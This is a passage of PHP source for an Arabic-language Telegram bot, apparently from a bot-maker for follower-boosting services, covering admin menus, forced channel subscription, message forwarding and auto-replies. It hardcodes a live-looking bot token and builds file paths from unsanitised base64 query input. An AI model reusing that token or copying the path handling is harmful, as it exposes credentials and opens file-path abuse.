$task_ex = explode("start_sock_",$data)[1];
if($task_ex){
    $Y = $start_sock[$task_ex];
    if($Y == "✅" or $Y == null){
        $t = "❌";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التعطيل
    ", 
            'show_alert'=>false
            ]); 
    }elseif($Y == "❌"){
        $t = "✅";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التفعيل
    ", 
            'show_alert'=>false
            ]); 
    }
    $start_sock[$task_ex] = $t;
    file_put_contents("$start_name",json_encode($start_sock));
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        "message_id"=>$message_id,
        'text' => "*
• مرحبا بك في قسم رساله الترحيب (/start) 🌾
- ستظهر هذه الرساله عند ارسال (/start) الى البوت الخاص بك 
*
- ارساله الحاليه :

`$start_msg`
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'الازرار الشفافه','callback_data'=>"azrars"]],
        [['text'=>'الاختصارات','callback_data'=>"xtsars"]],
         [['text'=>'تعيين الرساله','callback_data'=>"set_start"],['text'=>'مسح الرساله' ,'callback_data'=>"del_start"]],
        [['text'=>'رد علي الرسائل : ' . $start_sock["mode"],'callback_data'=>"start_sock_mode"]],
        [['text'=>'رجوع','callback_data'=>"paneel"]],
	]
	])
    ]);

}

$task_ex = explode("fords_",$data)[1];
if($task_ex){
    $Y = $fords[$task_ex];
    if($Y == "✅" or $Y == null){
        $t = "❌";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التعطيل
    ", 
            'show_alert'=>false
            ]); 
    }elseif($Y == "❌"){
        $t = "✅";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التفعيل
    ", 
            'show_alert'=>false
            ]); 
    }
    $fords[$task_ex] = $t;
    file_put_contents("$fords_name",json_encode($fords));
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم توجيه جميع الرسائل التي يتم ارسالها الى البوت 🚸

- يمكنك (تفعيل-تعطيل) توجيه الرسائل من المستخدمين 
- يمكنك (تفعيل-تعطيل) خاصيه مسح الرد الذي قام بالرد به البوت وابقاء الرد الخاص بك 
- يمكنك (تفعيل-تعطيل) شمول بقيه الادمنية بتوجيه الرسائل لهم
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'توجيه الرسائل : ' . $fords['del'],'callback_data'=>"fords_del"],['text'=>'مسح الرد تلقائيا : '. $fords['autodel'] ,'callback_data'=>"fords_autodel"]],
        [['text'=>'توجيه الرسائل الي بقيه المطورين : ' . $fords['toother'],'callback_data'=>"fords_toother"]],
        [['text'=>'رد علي الرسائل : ' . $fords['reply'],'callback_data'=>"fords_reply"]],
        [['text'=>'رجوع','callback_data'=>"paneel"]],
	]
	])
    ]);

}


$task_ex = explode("tasks_",$data)[1];
if($task_ex){
    $Y = $tasks[$task_ex];
    if($Y == "✅" or $Y == null){
        $t = "❌";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التعطيل
    ", 
            'show_alert'=>false
            ]); 
    }elseif($Y == "❌"){
        $t = "✅";
        bot('answerCallbackQuery',[ 
            'callback_query_id'=>$update->callback_query->id, 
            'text'=>"
            • تم التفعيل
    ", 
            'show_alert'=>false
            ]); 
    }
    $tasks[$task_ex] = $t;
    file_put_contents("$task_name",json_encode($tasks));
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
    • اهلا بك في لوحه الأدمن الخاصه بالبوت 🤖
    
    - يمكنك التحكم في البوت الخاص بك من هنا
    ~~~~~~~~~~~~~~~~~
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
        
    'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
            [['text'=>'أخر تحديثات البوت 🛍','url'=>"https://t.me/SeroMaker"]],
            [['text'=>'عمل البوت','callback_data'=>"botstat"],['text'=>'اشعار الدخول : '. $tasks['notife'] ,'callback_data'=>"tasks_notife"]],
        [['text'=>'الردود','callback_data'=>"rdod"],['text'=>'تعديل الازرار','callback_data'=>"azrars"],['text'=>'توجيه الرسائل','callback_data'=>"frdrs"]],
        [['text'=>'رساله الترحيب (start)','callback_data'=>"startmsg"]],
        [['text'=>'قسم الاشتراك الاجباري','callback_data'=>"shtraks"],['text'=>'قسم الأدمنيه','callback_data'=>"admins_bot"]],
        [['text'=>'قسم الاذاعه','callback_data'=>"broadcast"],['text'=>'قسم الأحصائيات','callback_data'=>"statebot"]],
		[['text'=>'اعدادات البوت','callback_data'=>"rshqG"]],
        ]
        ])
    ]);
}

}


if($chat_id != IDBot or $from_id != IDBot){

$d = date('D');
mkdir('onliner');
$day = explode("\n",file_get_contents("onliner/".USR_BOT."/".$d.".txt"));
if($d == "Sat"){
unlink("onliner/Fri.txt");
}
if($d == "Sun"){
unlink("onliner/Sat.txt");
}
if($d == "Mon"){
unlink("onliner/Sun.txt");
}
if($d == "Tue"){
unlink("onliner/Mon.txt");
}
if($d == "Wed"){
unlink("onliner/The.txt");
}
if($d == "Thu"){
unlink("onliner/Wed.txt");
}
if($d == "Fri"){
unlink("onliner/Thu.txt");
}

if(!in_array($from_id, $day)){
    file_put_contents("onliner/".USR_BOT."/".$d.".txt",$from_id."\n",FILE_APPEND);
}

$user_me = $update->message->from->username;

if ($user_me === null) {
    $user_me = "لايوجد";
} else {
    $user_me = "@$user_me";
}

$member_get = explode("\n", file_get_contents($member_name));

if (!in_array($from_id, $member_get)) {
    file_put_contents($member_name, $from_id . "\n", FILE_APPEND);
    if ($tasks['notife'] === '✅' && $from_id !== $admin && !in_array($from_id, $admins)) {
        $priv = getCountFromFile("$member_name");

        bot('sendMessage', [
            'chat_id' => $admin,
            'text' => "
٭ تم دخول شخص جديد الى البوت الخاص بك 👾
-----------------------
• معلومات العضو الجديد .

• الاسم : [$name](tg://user?id=$from_id)
• المعرف : [$user_me]
• الايدي : `$from_id`
-----------------------
• عدد الاعضاء الكلي : $priv
",
            'parse_mode' => 'markdown',
        ]);
    }
}

$chanel_get = explode('\n', file_get_contents("$chanel_name"));
$group_get = explode('\n', file_get_contents("$group_name"));
if($update->my_chat_member->chat->id){
    if($update->my_chat_member->chat->type == 'channel'){
if (!in_array($update->my_chat_member->chat->id, $chanel_get)) {
    file_put_contents("$chanel_name", file_get_contents($chanel_name) . "\n".$update->my_chat_member->chat->id);

}
}else{
    if (!in_array($update->my_chat_member->chat->id, $group_get)) {
        file_put_contents("$group_name", file_get_contents($group_name) . "\n".$update->my_chat_member->chat->id);
    
    }
}
}

if($blockers[$from_id] == true or $blockers[$user] == true or $blockers[$user_me] == true){
die();
}

if($from_id != $admin){
    if(!in_array($from_id,$admins)){
$ch_shtrak =  $shtrak['CHANNEL_ASAS'];
if($ch_shtrak != null){
    if($shtrak["start"] == '✅'){
        $b = "text";
        $t = "/start";
    }else{
        $b = "message";
    }
if($GLOBALS[$b] or $GLOBALS[$b] == $t){
if(preg_match("/@/",$ch_shtrak)){
    $ch_shtrak = $ch_shtrak;
    $lnker = "https://t.me/". str_replace("@","",$ch_shtrak);
}elseif(preg_match("/-/",$ch_shtrak)){
    if($shtrak['linker'][$ch_shtrak] == null){
    $ch_shtrak = bot("exportChatInviteLink",['chat_id'=>$ch_shtrak])->result;
    $lnker = $ch_shtrak;
    $shtrak['linker'][$shtrak['CHANNEL_ASAS']] = $ch_shtrak;
    file_put_contents("$shtrak_name",json_encode($shtrak));
    }else{
        $ch_shtrak = $shtrak['linker'][$ch_shtrak];
        $lnker = $ch_shtrak;
    }
}else{
    $ch_shtrak = "لايوجد";
}

$msg_shtrak = $shtrak['MSG_CHANNEL_ASAS'];
if($msg_shtrak == null){
    $msg_shtrak = "
🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه
    
- $ch_shtrak
    
‼️| اشترك ثم ارسل /start
    
.
    
    ";
}

if($shtrak["inline"] == "✅"){
$getch2 = json_decode(file_get_contents("http://" . $config['api_url'] . "/bot".API_KEY."/getChat?chat_id=".$shtrak['CHANNEL_ASAS']))->result;
$name_ch = $getch2->title;
}

$join = file_get_contents("https://" . $config['api_url'] . "/bot".API_KEY."/getChatMember?chat_id=".$shtrak['CHANNEL_ASAS']."&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
    if($shtrak["check"] == "✅"){
        bot('sendMessage',[
            'chat_id'=>$chat_id,
            'text'=>"
- - - - - - - - 
            ",
            'reply_to_message_id'=>$message->message_id,
            'reply_markup'=>json_encode([
                'keyboard'=>[
                    [['text'=>"تحقق من الاشتراك"]]
                  ],
                  'resize_keyboard'=>true])
            ]);
    }
    if($shtrak["markdown"] == "✅"){
        $ma = "Markdown";
        $rk = "parse_mode";
    }
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"

$msg_shtrak

",
$rk => $ma,
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id,
'reply_markup'=>json_encode([ 
'inline_keyboard'=>[
[['text'=>"$name_ch" ,'url'=>"$lnker"]],
]])
]);
if($shtrak["notife"] == '✅'){
$modes[$from_id] = "to_";
file_put_contents("$mode_name",json_encode($modes));
}
die();
}
}
}

if($shtrak["notife"] == '✅'){
    if($modes[$from_id] == "to_"){
$ch_shtrak =  $shtrak['CHANNEL_ASAS'];
if(preg_match("/@/",$ch_shtrak)){
    $ch_shtrak = $ch_shtrak;
    $lnker = "https://t.me/". str_replace("@","",$ch_shtrak);
}elseif(preg_match("/-/",$ch_shtrak)){
    if($shtrak['linker'][$ch_shtrak] == null){
    $ch_shtrak = bot("exportChatInviteLink",['chat_id'=>$ch_shtrak])->result;
    $lnker = $ch_shtrak;
    $shtrak['linker'][$shtrak['CHANNEL_ASAS']] = $ch_shtrak;
    file_put_contents("$shtrak_name",json_encode($shtrak));
    }else{
        $ch_shtrak = $shtrak['linker'][$ch_shtrak];
        $lnker = $ch_shtrak;
    }
}else{
    $ch_shtrak = "لايوجد";
}
        unset($modes[$from_id]);
        $modes['count'][$ch_shtrak] += 1;
file_put_contents("$mode_name",json_encode($modes));

bot('sendMessage',[
    'chat_id'=>$admin,
    'text'=>"
📥| شترك شخص جديد في قناة الاشتراك الاجباري

- القناة : [".$ch_shtrak."]
    
- العضو : [$name](tg://user?id=$from_id)
- ايدي العضو: `$from_id`

- عدد المشتركين بالقناة : ". $modes['count'][$ch_shtrak] ?? "0" ."
    
",
"parse_mode"=>"MarkDown",         

]);
    }
}

if($shtrak['CHANNELS']){
$Lr = ['inline_keyboard' => []];
foreach ($shtrak['CHANNELS'] as $chs){
    $u = array_search($chs , $shtrak['CHANNELS']);
    if($chs != "start"){
        $Lr['inline_keyboard'][] =  [['text'=>"$chs",'callback_data'=>"control_$u"],['text'=>'🗑','callback_data'=>"delch_$u"]];
        $join = file_get_contents("https://" . $config['api_url'] . "/bot".API_KEY."/getChatMember?chat_id=".$chs."&user_id=".$from_id);
if($message && (strpos($join,'"status":"left"') or strpos($join,'"Bad Request: USER_ID_INVALID"') or strpos($join,'"status":"kicked"'))!== false){
$Le = array_search($chs , $shtrak['CHANNELS']);
    $output = $chs;
if(preg_match("/-/",$output)){
$ch_shtrak = $output;
$getch2 = json_decode(file_get_contents("http://" . $config['api_url'] . "/bot".API_KEY."/getChat?chat_id=".$chs))->result;
$name_ch = $getch2->title;
    if(preg_match("/@/",$ch_shtrak)){
        $ch_shtrak = $ch_shtrak;
    }elseif(preg_match("/-/",$ch_shtrak)){
        if($shtrak['linker'][$chs] == null){
        $ch_shtrak = bot("exportChatInviteLink",['chat_id'=>$chs])->result;
        $shtrak['linker'][$chs] = $ch_shtrak;
        file_put_contents("$shtrak_name",json_encode($shtrak));
        }else{
            $ch_shtrak = $shtrak['linker'][$chs];
        }
    }else{
        $ch_shtrak = "لايوجد";
    }

}else{
    $ch_shtrak = $output;
}

$msg_sh = $shtrak["info"][$Le]['msg'];
if($msg_sh == null){
    $msg_sh = "
🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه
        
- $ch_shtrak
        
 ‼️| اشترك ثم ارسل /start
        
.
    ";
}

$ineed = $shtrak["info"][$Le]['cc'];
$doneneed = $shtrak["info"][$Le]['doneneed'] ?? "0";
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
[
$msg_sh
]
",
"parse_mode" => "markdown",
'disable_web_page_preview'=>true,
'reply_to_message_id'=>$message->message_id,
]);
$shtrak["info"][$Le]['doneneed'] += 1;
file_put_contents("$shtrak_name",json_encode($shtrak));

if($ineed != null){
if($doneneed == $ineed){
    bot('sendMessage',[
        'chat_id'=>$admin,
        'text'=>"
        *
- لقد شاهدو $ineed شخص الاشتراك الاجباري الخاص بك .
- القناة : *[$ch_shtrak] .
- وتم انتهاء التمويل بنجاح عزيزي الادمن .
*
- تم مسح القناة من الاجباري تلقائيا !!
*
        ",
        "parse_mode" => "markdown",
        ]);
unset($shtrak["info"][$Le]);
unset($shtrak['CHANNELS'][$Le]);
file_put_contents("$shtrak_name",json_encode($shtrak));
}
}

die();

    }
}

}
}

if($shtrak['socail']){
$sh_ms = $shtrak['socail']['link'];
if($sh_ms != null){

    if($helper[$sh_ms][$from_id]['count'] != 3){
$msg_whm = $shtrak['socail']['msg'];
if($msg_whm == null){
$msg_whm = "
🚸| عذرا عزيزي
🔰| عليك متابعه حسابي
    
- $sh_ms
    
‼️| تابعني من ثم ارسل /start
    
.

";
}  
bot('sendMessage',[
    'chat_id'=>$chat_id,
    'text'=>"
[
$msg_whm
]
",
"parse_mode"=>"MarkDown",         
]);
$helper[$sh_ms][$from_id]['count'] += 1;
file_put_contents("$helper_name",json_encode($helper));
die();
}
}
}

if($shtrak['bot']){
    $sh_ms = $shtrak['bot']['link'];
    if($sh_ms != null){
    
        if($helper['bot'][$sh_ms][$from_id]['count'] != 3){
    $msg_whm = $shtrak['bot']['msg'];
    if($msg_whm == null){
    $msg_whm = "
🚸| عذرا عزيزي
🔰| عليك الاشتراك بالبوت لتتمكن من استخدامه
    
- $sh_ms
    
‼️| اشترك في البوت من ثم ارسل /start
    
.
    
    ";
    }  
    bot('sendMessage',[
        'chat_id'=>$chat_id,
        'text'=>"
    [
    $msg_whm
    ]
    ",
    "parse_mode"=>"MarkDown",         
    ]);
    $helper['bot'][$sh_ms][$from_id]['count'] += 1;
    file_put_contents("$helper_name",json_encode($helper));
    die();
    }
    }
    }
        }
    }
if($text == "تحقق من الاشتراك"){
bot('sendMessage',[
        'chat_id'=>$chat_id,
        'text'=>"
- تم التحقق ✅

- ارسل الان /start
",
"parse_mode"=>"MarkDown",         
'reply_markup'=>json_encode([
'remove_keyboard'=>true
])
]);
die();
}


if($rdod['stat'] == "✅"){
$keyword = $text;

if ($rdod) {
    foreach ($rdod["msg"] as $index => $msg) {
        if (strpos($msg, $keyword) !== false) {
            $r = $rdod["msg"][$index];
            $b = $rdod["setting"][$r]["preg"];
            if($b == "✅"){
                bot("sendmessage",[
                    'chat_id' => $chat_id,
                    'text' => "
            [".$rdod['reply'][$text]."]
                    ",
                    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
                    'reply_to_message_id' => $message_id,
                ]);
                die();
            }
        }
    }
}



if($rdod['reply'][$text]){
    if($rdod["setting"][$text]["STOP"] == "✅"){
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
[".$rdod['reply'][$text]."]
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    ]);
    die();
}else{
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
[".$rdod['reply'][$text]."]
        ",
        'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
        'reply_to_message_id' => $message_id,
    ]);
}
}

}
if($chat_id != $admin){
if($fords['del'] == "✅"){
    if(!$data){
    if($fords['reply'] == '❌'){
    bot('forwardMessage', [
        'chat_id'=>$admin,
        'from_chat_id'=>$chat_id,
        'message_id'=>$message_id,
        ]);
    } else {
        bot('forwardMessage', [
            'chat_id'=>$admin,
            'from_chat_id'=>$chat_id,
            'message_id'=>$message_id,
            ]);
            bot("sendmessage",[
                'chat_id' => $chat_id,
                'text' => "
                • تم ارسال رسالتك للمطور
                ",
                'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
            ]);
    }
}
}
}

foreach ($xts["commands"] as $au){
    $a = explode(" - ",$au)[0];
    $r = explode(" - ",$au)[1];
    $Commands[] =  ['command'=>"$a",'description'=>"$r"];
}
bot('setMyCommands',[
'commands'=>json_encode($Commands)
]);

if($from_id != $admin or !in_array($from_id,$admins)){
if($bot_enter['bot'] == "❌"){ 
    if(preg_match('/start/',$text)){
        $code = explode('/start ',$text)[1];
        if($code == $bot_enter["link"]){
            $enters["mems-1"][$code] += 1;
            if(!in_array($from_id,$enters["mems"][$code])){
            $enters["mems"][$code][] = $from_id;
            }
            file_put_contents("$entars_name",json_encode($enters));
        }else{
            if($code){
            bot("sendmessage",[
                'chat_id' => $chat_id,
                'text' => "
                • كود دخول خاطء او منتهي صلاحيته .
                ",
                'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
            ]);
        }
        $msg_stop = $bot_enter["stoper"];
        if($msg_stop == null){
            $msg_stop = "• البوت تحت الصيانه حاليا .";
        }
            bot("sendmessage",[
                'chat_id' => $chat_id,
                'text' => "
$msg_stop
                ",
                'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
            ]);
            die();
        }
    }else{
        die();
    }
}
}

mkdir("FCZR/". X_) ;
$zr = json_decode(file_get_contents("FCZR/". X_ . "/zr.json"),true);


if(explode(":",$data)[0] == "enter"){
    if($zr['infonam'][explode(":",$data)[1]]){
    
    if($zr['infosect'][explode(":",$data)[1]] == "edit"){
    	$fic = "editmessagetext";
    
    
    }
    
    if($zr['infosect'][explode(":",$data)[1]] == "send"){
    	$fic = "sendMessage";
    
    }
    
    if($zr['infosect'][explode(":",$data)[1]] == "hmsa"){
    	$fic = "answerCallbackQuery";
    
    }
   
    
    
    
    
    
    $k15[inline_keyboard][]=[[text=>"• رجوع •",callback_data=>"tobot"]];
    bot($fic,[ 
    'chat_id'=>$chat_id, 
    'message_id'=>$message_id,
    'text'=>$zr['infodesc'][explode(":",$data)[1]],
    'parse_mode'=>"MARKDOWN",
    'callback_query_id'=>$update->callback_query->id,
    'reply_markup'=>json_encode($k15),
    'show_alert'=>true,
	]);
} 
	}
	
	$key=[];

$key[inline_keyboard][]=[['text'=>"الخدمات 🗂",'callback_data'=>"service"]];
$key[inline_keyboard][]=[['text'=>"تجميع ✳️",'callback_data'=>"plus"], ['text'=>"الحساب 🗃",'callback_data'=>"acc"]];
$key[inline_keyboard][]=[['text'=>"استخدام كود 💳",'callback_data'=>"hdia"], ['text'=>"تحويل نقاط ♻️",'callback_data'=>"transer"]];
$key[inline_keyboard][]=[['text'=>"معلومات الطلب 📥",'callback_data'=>"infotlb"],['text'=>"طلباتي 📮",'callback_data'=>"myrders"]];
$key[inline_keyboard][]=[['text'=>"قناة البوت 🤍",'url'=>"$chabot.t.me"]];
$key[inline_keyboard][]=[['text'=>"شحن نقاط 💰",'callback_data'=>"buy"],['text'=>"الشروط 📜",'callback_data'=>"termss"]];
$key[inline_keyboard][]=[['text'=>"عدد الطلبات : $bot_tlb ✅",'callback_data'=>"jj"]];
  $fuck = array(); 

  foreach ($zr['id'] as $i) {
      $name = $zr['infonam'][$i];
      $biozr = $zr['infodesc'][$i];
      $is_u = $zr['is_i'][$i];
  
      if (preg_match("#http#", $biozr)) {
          $key[inline_keyboard][] = [[text => "$name", url => $biozr]];
      } elseif ($is_u == true) {
          if (!isset($fuck[$i])) {
              $key[inline_keyboard][] = [[text => "$name", callback_data => "$i"]];
              $fuck[$i] = "o"; 
          }
      } else {
          if (!isset($fuck[$i])) {
              $key[inline_keyboard][] = [[text => "$name", callback_data => "enter:$i"]];
              $fuck[$i] = "o"; 
          }
      }
  }
  $ai = json_decode(file_get_contents("ai"),1);

  if($data == "tobot"){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        'message_id' => $message_id,
        'text' => $start_msg,
        'parse_mode' => 'MaRKDOWN',
        "reply_markup" => json_encode($key),
    ]);
  }
  $user_me = $update->message->from->username;

if ($user_me === null) {
    $user_me = "لايوجد";
} else {
    $user_me = "@$user_me";
}

  $start_msg = str_replace(
	array(
		'#name_user',
		'#username',
		'#name',
		'#coins',
		'#tlbs',
		'#shares',
		'#xtlb',
        'نقاط',
		'#id'
	)
	,
	array(
		"[$name](tg://user?id=$from_id)",
		$user_me,
		$name,
		$rshq["coin"][$from_id]??"0",
		$rshq['bot_tlb'] ?? "0",
		$rshq["mshark"][$from_id] ?? "0",
		$rshq["tlby"][$from_id] ?? "0",
        $rshq["name3mla"] ?? "نقاط",
		$from_id
	)
	, $start_msg);



}
mkdir("RSHQ/ALLS") ;
function SETJSON($INPUT){
  if ($INPUT !== null && $INPUT !== "") {
      $file_path = "RSHQ/ALLS/" . USR_BOT . "/rshq.json";

      $backup_dir = "RSHQ/ALLS/" . USR_BOT . "/backup/";
      if (!is_dir($backup_dir)) {
          mkdir($backup_dir, 0777, true);
      }

      $backup_path = $backup_dir . "rshq_backup_" . time() . ".json";
      copy($file_path, $backup_path);

      $backup_files = glob($backup_dir . "rshq_backup_*.json");
      if (count($backup_files) > 1) {
          $last_backup = max($backup_files);
          unlink($last_backup);
      }

      $encoded_input = json_encode($INPUT, JSON_PRETTY_PRINT);

      $temp_path = $file_path . ".temp";
      file_put_contents($temp_path, $encoded_input);

      rename($temp_path, $file_path);

      // sleep(1);

      $max_file_size = 1 * 1024 * 1024 * 1024; 
      if (filesize($file_path) > $max_file_size) {

          $temp_path = "RSHQ/ALLS/" . USR_BOT . "/temp/rshq_temp_" . time() . ".json";
          rename($file_path, $temp_path);
      }
  }
}




function SETJSON1($INPUT){
    if ($INPUT != NULL || $INPUT != "") {
        $F = "RSHQ/ALLS/". USR_BOT. "/tmoil.json";
        $N = json_encode($INPUT, JSON_PRETTY_PRINT);   
        file_put_contents($F, $N);
    }
}

function SETJSON12($INPUT){
  if ($INPUT != NULL || $INPUT != "") {
      $F ="RSHQ/ALLS/". USR_BOT. "/modes.json";
      $N = json_encode($INPUT, JSON_PRETTY_PRINT);   
      file_put_contents($F, $N);
      
  }
}

function SETJSON15($INPUT){
  if ($INPUT != NULL || $INPUT != "") {
      $F = "RSHQ/ALLS/". USR_BOT. "/str_jo.json";
      $N = json_encode($INPUT, JSON_PRETTY_PRINT);   
      file_put_contents($F, $N);
      
  }
}

function SETJSON16($INPUT){
  if ($INPUT != NULL || $INPUT != "") {
      $F = "RSHQ/ALLS/". USR_BOT. "/pv.json";
      $N = json_encode($INPUT, JSON_PRETTY_PRINT);   
      file_put_contents($F, $N);
      
  }
}
mkdir("RSHQ/ALLS/". USR_BOT) ;


$update = json_decode(file_get_contents('php://input'));
if($update->message){
	$message = $update->message;
$message_id = $update->message->message_id;
$username = $message->from->username;
$chat_id = $message->chat->id;
$title = $message->chat->title;
$text = $message->text;
$user = $message->from->username;
$name = $message->from->first_name;
$from_id = $message->from->id;
}

$timerFile = "RSHQ/ALLS/" . USR_BOT . "/TIMER.json";
$rshqFile = "RSHQ/ALLS/" . USR_BOT . "/rshq.json";
$tmoilFile = "RSHQ/ALLS/" . USR_BOT . "/tmoil.json";
$modesFile = "RSHQ/ALLS/" . USR_BOT . "/modes.json";
$BEROFile = "RSHQ/ALLS/" . USR_BOT . "/share.json";
$a3thuFILE = "RSHQ/ALLS/" . USR_BOT . "/A3thu.json";
$tlbsFILE = "RSHQ/ALLS/" . USR_BOT . "/tlbsme.json";
$tlbsme = json_decode(file_get_contents($tlbsFILE), true);
$timer = json_decode(file_get_contents($timerFile), true);
$rshq = json_decode(file_get_contents($rshqFile), true);
$tmoil = json_decode(file_get_contents($tmoilFile), true);
$modes = json_decode(file_get_contents($modesFile), true);
$BERO = json_decode(file_get_contents($BEROFile), true);
$a3thu = json_decode(file_get_contents($a3thuFILE), true);
$secn = $rshq['timers_sec'] ?? "3";

    if ($update->callback_query) {
      if ($rshq['timers'] == "on") {
        if ($timer["acount"][$from_id] < time()) {
            if ($update->callback_query->message->chat->id != $sudo and $update->callback_query->message->chat->id != 5561152568) {
                $data = $update->callback_query->data;
                $chat_id = $update->callback_query->message->chat->id;
                $title = $update->callback_query->message->chat->title;
                $message_id = $update->callback_query->message->message_id;
                $name = $update->callback_query->message->chat->first_name;
                $user = $update->callback_query->message->chat->username;
                $from_id = $update->callback_query->from->id;
                $timer["acount"][$from_id] = time() + $secn;
                file_put_contents($timerFile, json_encode($timer, JSON_UNESCAPED_UNICODE | JSON_NUMERIC_CHECK | JSON_PRETTY_PRINT));
            } else {
                $data = $update->callback_query->data;
                $chat_id = $update->callback_query->message->chat->id;
                $title = $update->callback_query->message->chat->title;
                $message_id = $update->callback_query->message->message_id;
                $name = $update->callback_query->message->chat->first_name;
                $user = $update->callback_query->message->chat->username;
                $from_id = $update->callback_query->from->id;
            }
        } else {
            bot('answerCallbackQuery', [
                'callback_query_id' => $update->callback_query->id,
                'text' => "انتظر $secn ثواني قبل ان تضغط امرأ آخر 😃",
                'show_alert' => true
            ]);
            exit;
        }

} else {
    $data = $update->callback_query->data;
    $chat_id = $update->callback_query->message->chat->id;
    $title = $update->callback_query->message->chat->title;
    $message_id = $update->callback_query->message->message_id;
    $name = $update->callback_query->message->chat->first_name;
    $user = $update->callback_query->message->chat->username;
    $from_id = $update->callback_query->from->id;
}
    }


$settingMaker = json_decode(file_get_contents("MakersNt/". base64_decode(explode("___",$_GET["ME"])[2]). "/R.json"),1);
	mkdir("AdsInfo/". USR_BOT) ;
	$thead = $settingMaker["setads"];
        $idad=$settingMaker["idad"][$thead];
	
	mkdir("AdsF/". USR_BOT) ;
	$pc = "AdsF/". USR_BOT. "/". $idad. ".txt";
	$cp = file_get_contents($pc);
	if(!in_array($from_id, explode("\n",$cp))) {
		bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
$thead
", 
'disable_web_page_preview'=>true, 
]);
file_put_contents($pc, $cp. "\n$from_id") ;
		file_put_contents("AdsInfo/".base64_decode(explode("___",$_GET["ME"])[2])."_". explode("___",$_GET["ME"])[1]. ".txt", file_get_contents("AdsInfo/".base64_decode(explode("___",$_GET["ME"])[2])."_". explode("___",$_GET["ME"])[1]. ".txt")+1) ;
		} 

    $fj = json_decode(file_get_contents('XCVVC'),1);
    if($chat_id == $sudo){
if(true){
	if(true) {
	$hui = "@SeroMaker";
	$t = "5599377703:AAHbH6NIC9VmTshWaUuFNw2djamzxJDMLSA";
$ch2 = file_get_contents("https://api.telegram.org/bot".$t."/getChatMember?chat_id=".$hui."&user_id=".$from_id);
$getch2 = json_decode(file_get_contents("http://api.telegram.org/bot".$t."/getChat?chat_id=".$hui))->result;
$Namech2 = $getch2->title;
$getch2li = str_replace("@","",$hui);
   


if($message && (strpos($ch2,'"status":"left"') or strpos($ch2,'"Bad Request: USER_ID_INVALID"') or strpos($ch2,'"status":"kicked"'))!== false){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"

🚸| عذرا عزيزي المطور
🔰| عليك الاشتراك بقناة الصانع لتتمكن من استخدامه
📣 |  وهذا الرساله تضهر عند مطورين البوتات فقط

- $hui

‼️| اشترك ثم ارسل /start

", 
'parse_mode'=>"markdown",
'disable_web_page_preview'=>true, 

]); 
$fj[$from_id] = true;
file_put_contents('XCVVC',json_encode($fj));
die();
}
}

} 
	
	} 

 if($fj[$from_id] == true){
    unset($fj[$from_id]);
    file_put_contents('XCVVC',json_encode($fj));
    bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
*
📣 تم تسجيل عضويتك في قاعده البيانات مجددا 
° بسبب الانضمام لقناة تحديثات الصانع شكرا لك
*
- انتضر قليلا ليتم التفعيل ...

", 
'parse_mode'=>"markdown",
'disable_web_page_preview'=>true, 

]); 
sleep(1.5);
  }

$e=explode("|", $data) ;
$e1=str_replace("/start",null,$text); 
$rshq = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT. "/rshq.json"),true);
if($text == "/start$e1" and is_numeric($e1) and !preg_match($text,"#Bero#")) {
  $rshq['HACKER'][$from_id] = "I";
  $rshq['HACK'][$from_id] = str_replace(" ", null, $e1);
  SETJSON($rshq);
}

$name3mla = $rshq["name3mla"] ?? "نقاط";

$BBM=1;

$sudo = $INFOBOTS["INFO_FOR"][bot("getme")->result->id]["SET_MY_ID"];
$admin = $sudo ;


$BERO = json_decode(file_get_contents("RSHQ/ALLS/". USR_BOT."/share.json"),true);

$Api_Tok = $rshq["sToken"];
$rsedi = json_decode(file_get_contents("https://".$rshq["sSite"]."/api/v2?key=$Api_Tok&action=balance"));
$flos = $rsedi->balance; 
$treqa = $rsedi->currency; 

$b="Bero";

$INFOBOTS["IS_VIP"][$INFOBOTS["INFO_FOR"][bot("getme")->result->id]]["SET_MY_ID" ] = true;
if($b=="Beroj" ){
$adm = [ 
  'inline_keyboard'=>[
